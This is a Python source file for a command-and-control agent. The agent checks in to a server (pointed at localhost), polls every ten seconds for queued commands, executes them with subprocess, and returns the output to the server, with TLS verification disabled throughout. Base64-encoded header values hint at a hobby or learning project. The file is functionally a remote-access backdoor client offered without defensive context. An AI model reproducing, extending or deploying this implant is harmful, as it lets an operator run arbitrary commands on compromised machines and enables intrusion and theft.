import requests
import json
from time import sleep
import subprocess
import sys
import random
import sys

class Agent(object):

	url = "https://127.0.0.1:9000/"
	random_num = random.randint(100,90000)
	#payload = "{\"agent_id\": \"{}\",\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}".format(random_num)
	payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
	payload = json.dumps(payload)
	headers = {
	  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Content-Type': 'application/json',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK'
	}

	
	#response = requests.request("POST", url, headers=headers, data = payload)
	#response_json = response.json()


	def first_checkin(self):
		url = self.url + 'first_check_in'
		self.response = requests.request("POST",url,headers=self.headers,data = self.payload,verify=False)
		self.response_json = self.response.json()
		self.doc_id = self.response_json['id']
		self.rev_num = self.response_json['rev']
		self.access_token = self.response_json['token']
		self.refresh_token = self.response_json['refresh']
		print(self.response_json)
		return

	def check(self):
		url = self.url + "poll"
		headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("GET",url,headers=headers,verify=False)
		response_json = dict(response.json())
		print(response_json)
		self.updated_payload = response_json
		if response_json['pending_commands']: 
			self.cmd = response_json['pending_commands'][0]
			cmd_split = self.cmd.split(" ")
			try:
				result = subprocess.run(cmd_split,capture_output=True)
				self.cmd_result = {self.cmd:result.stdout.decode("utf-8")}
				try:
					### Requesting new token ###
					refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
					resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
					resp = resp.json()
					self.access_token = resp['token'] ## new token
					return True
				except:
					print("couldnt refresh token")
					return False
			except:
				self.cmd_result = {self.cmd:"Error running command"}
				return True
		else:
			print("no command")
			### Requesting new token ###
			refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
			resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
			resp = resp.json()
			self.access_token = resp['token'] ## new token
			return False


	def post_complete_command(self):
		url = self.url + "poll"
		self.updated_payload['pending_commands'].remove(self.cmd) ## removes pending command[0] 
		self.updated_payload['completed_commands'].append(self.cmd_result)
		print(self.updated_payload)
		headers = {"Content-Type":"application/json","doc_id":self.doc_id, "Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload),verify=False,)
		print(response.text)
		print("completed post to database")


	def refresh_token(self):
		refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
		refresh_url = self.url + "refresh"
		resp = requests.request("GET",refresh_url,headers=refresh_header,verify=False,)
		resp_json = resp.json()
		print(resp_json['token'])
		return resp_json['token']


	def main(self):
		agent = Agent()
		agent.first_checkin()
		while True:
			sleep(10)
			if agent.check():
				agent.post_complete_command()
				print("posted to database")
			else:
				print("no commands found")

if __name__ == "__main__":
    Agent().main()